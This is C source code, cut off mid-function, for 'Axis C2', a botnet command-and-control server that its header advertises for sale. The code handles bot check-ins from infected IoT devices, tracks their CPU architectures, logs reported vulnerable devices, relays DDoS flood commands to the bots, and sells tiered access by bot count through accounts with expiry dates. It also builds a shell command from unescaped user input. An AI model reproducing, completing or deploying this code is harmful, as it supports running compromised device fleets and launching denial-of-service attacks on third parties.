/*                   Axis C2 By Tragedy And Snicks
[+]=======================================================================[+]
         This Program Was Made To Mimic All Features From Cayo v3
           While Being As Light On Hosting Machines As Possible
                   * This Is Not "ALL FROM SCRATCH" *
              * Why Remake Shit That Already Works Well? *

    Floods:
    - *Does NOT Send Anything Other Than Successful Flood Cmds To Socket*
    (Most Sources Send Anything You Type To The Bot Socket; Very Insecure)
    - *Foolproof Floods/Customizable Floods + Syntax Checking*
    (Preset Args For Spoofs/Size/Poll/Sleep For Idiots...
                                   ...There Are Still Customizable Floods)
    - Syntax Checking/Clarifying - Will Not Send Invalid Flood Cmds To Sock 
    Server:
    - Message Of The Day Feature
    - Online Users (Shows IP Address To Admins) 
    - Direct Message Users
    - Show Account Stats
    Admin Cmds:
    - Listening Block: Allows Admins To Listen To User Floods
       Without Watching Screen
    - Prompted AddUser/DelUser
    - Kick Users
    - Ban/Unban Users/IPv4 from Raw Connection
    - Blacklist/UnBlacklist IPv4
    - Change MOTD
    Full Account Stats:
    - Admin/Reg
    - Account Expiry
    - Device Limit Plans
    - Max Time
    - Cooldown
    Tools:
    - IPLookup
    - Resolver

    Runs Extremely Light: 10 Accounts ~ 1gb Ram + Minimal Core
    If You Leak/Rip You're a POS         Sales Release: 10/05/2019
[+]=================================================================[+]*/
#include "AXHDRS/INC.h"
#include "AXHDRS/RSL.h"
//[+]===============================================================[+]
#define PORT 747 //Desired C2 Port           -RyM Gang-                      
char *api_host = "1.1.1.1"; //Where IPLookup API Is Hosted        

#define DB "DB.txt" //Account Information File            
#define LFD "AXLogs" //Log File Directory
#define TRIG "." //Bot Trigger
//[+]===============================================================[+]
#define MXFDS 1000000
#define MXPRMS 10

struct ACNTs{
    char axid[20];
    char axp[20];
    char axt[30];
    char axexp[15];
    char axpln[200];
    int axdevs;
    int axsecs;
    int axcldwn;
} ACCS[MXFDS];
struct TELData{
    char ip[16];
    int connd;
    char nick[20];
    int axadm;
    char axexp[20];
    int axsecs;
    int axcldwn;
    int cdscs;
    int cdsts;
    int lblock;
} MNGRS[MXFDS];
struct CLDWNArgs{
    int sock;
    int seconds;
};
struct CNSLData{
    char banned[20];
} CNSL[MXFDS];
char pr_motd[1100];
char wld_motd[1024];
char *ban_log[MXFDS]={ 0 };
struct TEL_LSTNArgs{
    int sock;
    uint32_t ip;
};
struct CLNTData{
    uint32_t ip;
    char connd;
    char arch[30];
} CLNTS[MXFDS];
unsigned int MIPS = 0;
unsigned int MIPSEL = 0;
unsigned int ARM4 = 0;
unsigned int ARM5 = 0;
unsigned int ARM6 = 0;
unsigned int ARM7 = 0;
unsigned int X86 = 0;
unsigned int PPC = 0;
unsigned int SUPERH = 0;
unsigned int M68K = 0;
unsigned int SPARC = 0;
unsigned int UNKNOWN = 0;
unsigned int DEBUG = 0;

int input_argc = 0;
char *input_argv[MXPRMS + 1] = { 0 };
void Split_Str(char *strr){
    int i = 0;
    for (i = 0; i < input_argc; i++)
        input_argv[i] = NULL;
    input_argc = 0;
    char *token = strtok(strr, " ");
    while (token != NULL && input_argc < MXPRMS){
        input_argv[input_argc++] = malloc(strlen(token) + 1);
        strcpy(input_argv[input_argc - 1], token);
        token = strtok(NULL, " ");
    }
}
void RMSTR(char *str, char *file){
    char RMSTR[1024];
    snprintf(RMSTR, sizeof(RMSTR), "sed -i '/%s/d' %s", str, file);
    system(RMSTR);
    memset(RMSTR, 0, sizeof(RMSTR));
    return;
}
int availdevs;
//[+]== Customer Plans ==[+]
char *plans[] = {         //
    "0" //No Bots         //
    "50", //50 Bots       //
    "100", //100 Bots     //
    "1000", //1000 Bots   //
    "5000", //5000 Bots   //
    "-1" //All Bots       //
};//[+]==================[+]

char day[10];
char month[10];
char year[10];
char *my_day;
char my_month[10];
char my_year[10];

int Get_Time(void){
    time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(day, 3, "%d", tm_info);
    strftime(month, 3, "%m", tm_info);
    strftime(year, 5, "%Y", tm_info);
    return 0;
}
void En_Cooldown(void *arguments){
    struct CLDWNArgs *args = arguments;
    int fd = (int)args->sock;
    int seconds = (int)args->seconds;
    MNGRS[fd].cdscs = 0;
    time_t start = time(NULL);
    if(MNGRS[fd].cdsts == 0)
        MNGRS[fd].cdsts = 1;
    while(MNGRS[fd].cdscs++ <= seconds) sleep(1);
    MNGRS[fd].cdscs = 0;
    MNGRS[fd].cdsts = 0;
    return;
}
//[+]==================================================[+]

//[+]================================[+]
static volatile FILE *telFD;          //
static volatile FILE *fileFD;         //
static volatile int epollFD = 0;      //
static volatile int listenFD = 0;     //
static volatile int TELFound = 0;     //
static volatile int UsersOnline = 0;  //
//[+]================================[+]

const char *Get_Host(uint32_t addr){
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}
static int MakeSocket_NonBlocking (int sfd){
    int flags, s;
    flags = fcntl (sfd, F_GETFL, 0);
    if (flags == -1){
        perror ("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl (sfd, F_SETFL, flags); 
    if (s == -1){
        perror ("fcntl");
        return -1;
    }
    return 0;
}
int Search_in_File(char *str){
    FILE *fp;
    int line_num = 0;
    int find_result = 0, fnd=0;
    char temp[1024];
    if((fp = fopen(DB, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            fnd = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return fnd;
}
void Trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int CreateAndBind (char *port){
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0){
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next){
        sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0)
        {
            break;
        }
        close (sfd);
    }
    if (rp == NULL){
        fprintf (stderr, "Change The Port Idiot\n");
        return -1;
    }
    freeaddrinfo (result);
    return sfd;
}
//[+]=================================================================================[+]
void Broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int axisfd){
    int sendMGM = 1;
    if(strcmp(msg, "PING") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    Trim(wot);
    time_t rawtime;
    struct tm * timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    Trim(timestamp);
    char fhdjkc[1024];
    int i;
    char *bin_type;
    char mybin_type[40];
    if(strstr(msg, "bin=") || strstr(msg, "BIN=")){
        char *mytok = strtok(msg, "=");
        char mytok2[200];
        snprintf(mytok2, sizeof(mytok2), "%s", mytok+strlen(mytok)+1);
        bin_type = strtok(mytok2, " ");
        if(bin_type == NULL || bin_type == " ")
            bin_type = "ALL";
        //printf("Bin is -> %s\n", bin_type);
        msg = strtok(mytok2, " ")+strlen(mytok2)+1;
        snprintf(mybin_type, sizeof(mybin_type), "%s", bin_type);
        Trim(mybin_type);
        Trim(msg);
    }
    else
        snprintf(mybin_type, sizeof(mybin_type), "%s", "ALL");
    for(i = 0; i < amt2send; i++){
        if(i == us || (!CLNTS[i].connd &&  (sendMGM == 0 || !MNGRS[i].connd))) continue;
        if(fuck == 1 ){
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n"R"["Y"%s Logged In"R"]", sender);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"軸"W": ", MNGRS[i].nick);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            memset(message, 0, sizeof(message));
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
        else if(fuck == 3){
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n"R"["Y"Admin(%s) Logged In"R"]", sender);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"軸"W": ", MNGRS[i].nick);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            memset(message, 0, sizeof(message));
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
        else if(fuck == 2){
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n"R"[\x1b[0m%s Logged Out"R"]", sender);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"軸"W": ", MNGRS[i].nick);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            memset(message, 0, sizeof(message));
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
        else if(fuck == 4){
            char *message[1024];
            snprintf(message, sizeof(message), "\r\n"R"[\x1b[0mAdmin(%s) Logged Out"R"]", sender);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, message, strlen(message), MSG_NOSIGNAL);
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"軸"W": ", MNGRS[i].nick);
            if(sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            memset(message, 0, sizeof(message));
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
        else{
            if(MNGRS[i].lblock == 0 && sendMGM && MNGRS[i].connd){
                send(i, "\n", 1, MSG_NOSIGNAL);
                send(i, ""R"", strlen(""R""), MSG_NOSIGNAL);
                send(i, sender, strlen(sender), MSG_NOSIGNAL);
                send(i, ": ", 2, MSG_NOSIGNAL); 
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
            }
            if(strstr(mybin_type, "ALL")){
                if(CLNTS[i].connd){
                    send(i, msg, strlen(msg), MSG_NOSIGNAL);
                    send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
                    send(i, "\r\n", 2, MSG_NOSIGNAL);
                }
            }
            else if(CLNTS[i].connd && strstr(CLNTS[i].arch, mybin_type)){
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
                send(i, "\r\n", 2, MSG_NOSIGNAL);
            }
            else
                continue;
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"軸"W": \x1b[0m", MNGRS[i].nick);
            if(MNGRS[i].lblock == 0 && sendMGM && MNGRS[i].connd && !CLNTS[i].connd) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
            else if(MNGRS[i].lblock == 0 && !CLNTS[i].connd) send(i, "\r\n", 1, MSG_NOSIGNAL);
            memset(fhdjkc, 0, sizeof(fhdjkc));
        }
    }
    free(wot);
}
//[+]===============================[+]
int fdgets(unsigned char *buffer, int bufferSize, int fd){
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got;
}
void *EpollEventLoop(void *useless){
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    int x = 0;
    events = calloc (MXFDS, sizeof event);
    while (1){
        int n, i;
        n = epoll_wait (epollFD, events, MXFDS, -1);
        for (i = 0; i < n; i++){
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))){
                CLNTS[events[i].data.fd].connd = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (listenFD == events[i].data.fd){
                while (1){
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;
                    in_len = sizeof in_addr;
                    infd = accept (listenFD, &in_addr, &in_len);
                    if (infd == -1){
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else{
                            perror ("accept");
                            break;
                        }
                    }
                    CLNTS[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for(ipIndex = 0; ipIndex < MXFDS; ipIndex++){
                        if(!CLNTS[ipIndex].connd || ipIndex == infd) continue;
                        if(CLNTS[ipIndex].ip == CLNTS[infd].ip){
                            dup = 1;
                            break;
                        }
                    }
                    if(dup){
                        if(send(infd, ""TRIG" FUCKOFF\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                        close(infd);
                        continue;
                    }
                    s = MakeSocket_NonBlocking (infd);
                    if (s == -1) { close(infd); break; }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1){
                        perror ("epoll_ctl");
                        close(infd);
                        break;
                    }
                    CLNTS[infd].connd = 1;
                }
                continue;
            }
            else{
                int thefd = events[i].data.fd;
                struct CLNTData *client = &(CLNTS[thefd]);
                int done = 0;
                client->connd = 1;
                while (1){
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
 
                    while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0){
                        if(strstr(buf, "\n") == NULL) { done = 1; break; }
                        Trim(buf);
                        if(strcmp(buf, "PING") == 0){ //Basic IRC-Like Ping-Pong Challenge To See If Server Is Alive
                            if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } //Response
                            continue;
                        }
                        else if(strstr(buf, "REPORT ") == buf){ //Received A Report Of A Vulnerable Device
                            char *line = strstr(buf, "REPORT ") + 7; 
                            fprintf(telFD, "%s\n", line); //Let's Write It Out To A Disk
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        else if(strcmp(buf, "PONG") == 0){
                            continue;
                        }
                        else if(strstr(buf, "arch ") != NULL){
                        //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                            char *arch = strstr(buf, "arch ") + 5;
                            strcpy(CLNTS->arch, arch);
                            strcpy(CLNTS[thefd].arch, arch);
                            printf(AXISY" IP: %s | Arch: %s\n", Get_Host(/*clients[thefd].ip*/client->ip), arch);
                            //char k[60];
                            //sprintf(k, "echo '%s' >> C2Logs/Bot_Connections.log", Get_Host(client->ip));
                        }
                        else{
                            int nig = 0;
                            nig = 1;
                            //printf("buf: \"%s\"\n", buf);
                        }
                    }
                    if (count == -1){
                        if (errno != EAGAIN){
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0){
                        done = 1;
                        break;
                    }
                }
                if (done){
                    client->connd = 0;
                    snprintf(client->arch, sizeof(client->arch), "%s", "timed-out");
                    snprintf(client[thefd].arch, sizeof(client[thefd].arch), "%s", "timed-out");
                    close(thefd);
                }
            }
        }
    }
}
unsigned int DevsConnected(){
    int i = 0, total = 0;
    for(i = 0; i < MXFDS; i++){
        if(!CLNTS[i].connd) continue;
        total++;
    }
    return total;
}
//[+]==============[+]
void countArch(){
    int x;
    for(x = 0; x < MXFDS; x++){
        if(strstr(CLNTS[x].arch, "mips") && CLNTS[x].connd == 1)
            MIPS++;
        else if(strstr(CLNTS[x].arch, "mipsel") || strstr(CLNTS[x].arch, "mpsl") && CLNTS[x].connd == 1)
            MIPSEL++;
        else if(strstr(CLNTS[x].arch, "armv4") && CLNTS[x].connd == 1)
            ARM4++;
        else if(strstr(CLNTS[x].arch, "armv5") && CLNTS[x].connd == 1)
            ARM5++;
        else if(strstr(CLNTS[x].arch, "armv6") && CLNTS[x].connd == 1)
            ARM6++;
        else if(strstr(CLNTS[x].arch, "armv7") && CLNTS[x].connd == 1)
            ARM6++;
        else if(strstr(CLNTS[x].arch, "x86") && CLNTS[x].connd == 1)
            X86++;
        else if(strstr(CLNTS[x].arch, "powerpc") && CLNTS[x].connd == 1)
            PPC++;
        else if(strstr(CLNTS[x].arch, "sh4") && CLNTS[x].connd == 1)
            SUPERH++;
        else if(strstr(CLNTS[x].arch, "m68k") && CLNTS[x].connd == 1)
            M68K++;
        else if(strstr(CLNTS[x].arch, "sparc") && CLNTS[x].connd == 1)
            SPARC++;
        else if(strstr(CLNTS[x].arch, "unknown") && CLNTS[x].connd == 1)
            UNKNOWN++;
        else if(strstr(CLNTS[x].arch, "debug") && CLNTS[x].connd == 1)
            DEBUG++;
    }
}
void *titleWriter(void *sock){
    int axisfd = (int)sock;
    char *string[2048];
    while(1){
        memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices: %d | Users Online: %d %c", '\033', DevsConnected(), UsersOnline, '\007');
        if(send(axisfd, string, strlen(string), MSG_NOSIGNAL) == -1) return; 
        sleep(3);
    }
}
//[+]=======================[+]
char *cnc_n = "Axis";        //
char *cnc_ver = "1";         //
char *cpyrt_n = "RyM Gang";  //
void *TelWorker(void *arguments){
        char axis[1024];
        char buf[2048];
        char cmd[70];
        char usrnms[80];
        struct TEL_LSTNArgs *args = arguments;
        int axisfd = (int)args->sock;
        const char *management_ip = Get_Host(args->ip);
        //printf("%s\n", management_ip);
        int fnd;
        pthread_t title;
        char* nckstrn;
        memset(buf, 0, sizeof(buf));
    
        FILE *fp;
        int i = 0;
        int c;
        fp = fopen(DB, "r"); 
        while(!feof(fp)){
            c = fgetc(fp);
            ++i;
        }
        int j = 0;
        rewind(fp);
        while(j!=i-1) {
            fscanf(fp, "%s %s %s %s %s %d %d", ACCS[j].axid, ACCS[j].axp, ACCS[j].axt, ACCS[j].axexp, ACCS[j].axpln, &ACCS[j].axsecs, &ACCS[j].axcldwn);
            ++j;
        }
        
        if(!strcmp(management_ip, "127.0.0.1")){
            char *kkkkeee = "\x1b[31mError, You cannot access this C2 from localhost, Sorry...\r\n";
            if(send(axisfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
            close(axisfd);
            goto end;
        }

        char login1 [5000];
        char login2 [5000];
        sprintf(login1,  ""W"Welcome To "R"%s \x1b[0m| "W"Version "R"%s "W"| \r\n", cnc_n, cnc_ver);
        sprintf(login2,  ""W"Enter Credentials To Join"R"...\r\n\r\n");
        if(send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        wait:
        if(fdgets(buf, sizeof buf, axisfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "login")){
            if(send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
            if(send(axisfd, login1, strlen(login1), MSG_NOSIGNAL) == -1) goto end;
            if(send(axisfd, login2, strlen(login2), MSG_NOSIGNAL) == -1) goto end;
        }
        else{
            if(send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
            goto wait;
        }

        //Send Username
        if(send(axisfd, ""R"Axis ID: "W"", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, axisfd) < 1) goto end;
        Trim(buf);
        sprintf(usrnms, buf);
        nckstrn = ("%s", buf);
        fnd = Search_in_File(nckstrn);
        int mynick;
        for(mynick=0; mynick < MXFDS; mynick++){
            if(!strcmp(MNGRS[mynick].nick, nckstrn)){
                char *kkkkeee = "\x1b[31mError, User Is Already Logged In On This Network!\r\n";
                if(send(axisfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
                sleep(10);
                close(axisfd);
                goto end;
            }
            else if(!strcmp(CNSL[mynick].banned, management_ip)){
                char *kkkkeee = "\x1b[31mError, You've Been Banned!\r\n";
                if(send(axisfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
                sleep(10);
                close(axisfd);
                goto end;
            }
        }
        if(strcmp(nckstrn, ACCS[fnd].axid) != 0) goto failed;
        Get_Time();
        snprintf(MNGRS[axisfd].axexp, sizeof(MNGRS[axisfd].axexp), "%s", ACCS[fnd].axexp);
        my_day = strtok(ACCS[fnd].axexp, "/");
        snprintf(my_month, sizeof(my_month), "%s", my_day+strlen(my_day)+1);
        snprintf(my_year, sizeof(my_year), "%s", strtok(ACCS[fnd].axexp, "/")+1+strlen(my_month)-2);
        char *my_exp_msg;
        if(atoi(day) > atoi(my_day) && atoi(month) >= atoi(my_month) || atoi(month) > atoi(my_month) && atoi(year) >= atoi(my_year) || atoi(year) > atoi(my_year)){
            // expired
            if(send(axisfd, "\033[2J\033[1;1H", 14, 0) == -1) return;
            my_exp_msg = "\x1b[31mYour "R"Axis\x1b[31m Account Has Expired, Message an Admin to Renew Subscription.\x1b[37m\r\n";
            if(send(axisfd, my_exp_msg, strlen(my_exp_msg), 0) == -1) return;
            //printf(my_exp_msg);
            my_exp_msg = malloc(strlen(my_exp_msg));
            sleep(10);
            close(axisfd);
            goto end;
        }
        //Send Password
        if(send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
        if(strcmp(nckstrn, ACCS[fnd].axid) == 0){    
        if(send(axisfd, ""W"Password: ", 23, MSG_NOSIGNAL) == -1) return;
        if(fdgets(buf, sizeof buf, axisfd) < 1) return;
        if(send(axisfd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
        Trim(buf);
        if(strcmp(buf, ACCS[fnd].axp) != 0) goto failed;
        memset(buf, 0, 2048);
        goto noice;

        failed:
        if(send(axisfd, "\033[1A", 5, MSG_NOSIGNAL) == -1) return;
        char *kkkkkkk = "\x1b[31mError, Incorrect Login Credentials! Attempt Logged!\r\n";
        if(send(axisfd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) return;
        FILE *logFile;
        logFile = fopen(""LFD"/Failed_Logins.log", "a");
        fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
        printf(""W"["R"!!!"W"] "R"Failed Login Attempt "W"("R"%s"W") "W"["R"!!!"W"]\n", management_ip);
        fclose(logFile);
        memset(buf, 0, 2048);
        sleep(10);
        close(axisfd);
        goto end;

        noice:
        UsersOnline ++;
        pthread_create(&title, NULL, &titleWriter, axisfd);
        snprintf(MNGRS[axisfd].nick, "%s", ACCS[fnd].axid);
        FILE *conlog = fopen(""LFD"/User_Connections.log", "a+");
        fprintf(conlog, "[%s] -> [%s]\n", management_ip, MNGRS[axisfd].nick);
        fclose(conlog);
        if(!strcmp(ACCS[fnd].axt, "admin")){
            MNGRS[axisfd].axadm = 1;
            Broadcast(buf, axisfd, MNGRS[axisfd].nick, 3, MXFDS, axisfd);
            printf(AXISY" "W"["R"Admin("W"%s"R":"W"%s"R")"W"] \x1b[32mLogged In! "AXISY"\x1b[0m\n", MNGRS[axisfd].nick, management_ip);
        }
        else{
            MNGRS[axisfd].axadm = 0;
            Broadcast(buf, axisfd, MNGRS[axisfd].nick, 1, MXFDS, axisfd);
            printf(AXISY" "W"["R"User("W"%s"R":"W"%s"R")"W"] \x1b[32mLogged In! "AXISY"\x1b[0m\n", MNGRS[axisfd].nick, management_ip);
        }
        if(!strcmp(ACCS[fnd].axpln, plans[0])) 
            availdevs = 0;
            ACCS[fnd].axdevs = 0;
        }
        else if(!strcmp(ACCS[fnd].axpln, plans[1])){
            availdevs = 50;
            ACCS[fnd].axdevs = 50;
        }
        else if(!strcmp(ACCS[fnd].axpln, plans[2])){
            availdevs = 100;
            ACCS[fnd].axdevs = 100;
        }
        else if(!strcmp(ACCS[fnd].axpln, plans[3])){
            availdevs = 1000;
            ACCS[fnd].axdevs = 1000;
        }
        else if(!strcmp(ACCS[fnd].axpln, plans[4])){
            availdevs = 5000;
            ACCS[fnd].axdevs = 5000;
        }
        else if(!strcmp(ACCS[fnd].axpln, plans[5])){
            availdevs = MXFDS;
            ACCS[fnd].axdevs = MXFDS;
        }
        sprintf(axis, ""W"["R"+"W"] Welcome "R"%s"W"...\r\n", MNGRS[axisfd].nick);
        if(send(axisfd, axis, strlen(axis), 0) == -1) goto end;
        sprintf(axis, AXISY" "W"Account Expiry: "R"%s \r\n", MNGRS[axisfd].axexp);
        if(send(axisfd, axis, strlen(axis), 0) == -1) goto end;
        if(strlen(wld_motd) > 0) { //Detect If MOTD Is Not NULL
            if(send(axisfd, pr_motd, strlen(pr_motd), MSG_NOSIGNAL) == -1) goto end;
        }

        MNGRS[axisfd].connd = 1;
        MNGRS[axisfd].axsecs = ACCS[fnd].axsecs;
        MNGRS[axisfd].axcldwn = ACCS[fnd].axcldwn;                             
        MNGRS[axisfd].lblock = 1; // 0=Block Open/1=Block Closed
        
        snprintf(MNGRS[axisfd].ip, sizeof(MNGRS[axisfd].ip), "%s", management_ip); //Store Our IP
        
        char axis1 [5000];
        char axis2 [5000];
        char axis3 [5000];
        char axis4 [5000];
        char axis5 [5000];
        char axis6 [5000];
        char axis7 [5000];
        char axis8 [5000];

        sprintf(axis1, "\r\n            "W"· ▪"R"▄████████ ▀████"W"▪   ·"R"▐███▀ "W"·"R"▄█  "W"·"R"▄████████"W"▪·\r\n");
        sprintf(axis2, "           "W"·  "R"███   "W"·"R"███ "W"· "R"███▌  "W"·"R"▐███ "W"▪ "R"███"W"· "R"███  "W"· "R"███  "W"·\r\n");
        sprintf(axis3, "             "W"·"R"███"W"·   "R"███▌  "W"▪"R"███"W"·  "R"███    ███▌"W"·"R"███"W"·   "R"█▀"W"·\r\n");
        sprintf(axis4, "            "W"· "R"███   "W"▪"R"███  "W"· "R"▀███▄███▀  "W"· "R"███▌ ███ "W"·   ·  ▪\r\n");
        sprintf(axis5, "            "R"▀███████████▌   "W"·"R"▄██▀██▄ "W"·   "R"███▌▀██████████  "W"·\r\n");
        sprintf(axis6, "          "W"·   "R"███▌"W"·  "R"███"W"·  "R"▐███ "W"· "R"███▌  "W"·"R"███"W"·  ·    ▪"R"██"W"·\r\n");
        sprintf(axis7, "             "W"▪"R"███   "W"·"R"███  ▄███ "W"▪  ·"R"███▄"W"· "R"███ "W"▪ "R"▄█"W"· · "R"███ "W"·\r\n");
        sprintf(axis8, "            "W"·"R"▄███"W"·   "R"█▀ "W"·"R"▄███"W"·  ·   "R"███▄ █▀"W"· "R"▄████████▀"W"·\r\n\r\n");

        if(send(axisfd, axis1, strlen(axis1), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis2, strlen(axis2), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis3, strlen(axis3), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis4, strlen(axis4), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis5, strlen(axis5), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis6, strlen(axis6), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis7, strlen(axis7), MSG_NOSIGNAL) == -1) return;
        if(send(axisfd, axis8, strlen(axis8), MSG_NOSIGNAL) == -1) return;
        sprintf(axis, "              "AXISY" "W"Type "R"HELP "W"For A Commands List! "AXISY"\r\n\r\n");
        if(send(axisfd, axis, strlen(axis), 0) == -1) return; 
        char *axisprompt[200];
        snprintf(axisprompt, sizeof(axisprompt), ""R"%s"W"@"R"軸"W": "W"", MNGRS[axisfd].nick);
        if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;

        while(fdgets(buf, sizeof buf, axisfd) > 0){

        if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear")){
            if(send(axisfd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis1, strlen(axis1), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis2, strlen(axis2), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis3, strlen(axis3), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis4, strlen(axis4), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis5, strlen(axis5), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis6, strlen(axis6), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis7, strlen(axis7), MSG_NOSIGNAL) == -1) return;
            if(send(axisfd, axis8, strlen(axis8), MSG_NOSIGNAL) == -1) return;
            pthread_create(&title, NULL, &titleWriter, axisfd);
            MNGRS[axisfd].connd = 1;
        }
        else if(strstr(buf, "CHANGEMOTD")){
            if(MNGRS[axisfd].axadm == 1){
                if(strlen(wld_motd) > 0) {
                    memset(wld_motd, 0, sizeof(wld_motd));
                }
                int motd_least_len = 3;
                if(MNGRS[axisfd].connd && MNGRS[axisfd].axadm > 0) {
                    sprintf(axis, ""R"["W"MOTD"R"]\r\n"R"["W"New MOTD"R"]"W": ");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    while(fdgets(wld_motd, sizeof(wld_motd), axisfd) < 1){
                        Trim(wld_motd);
                        if(strlen(wld_motd) < motd_least_len) continue;
                        break;
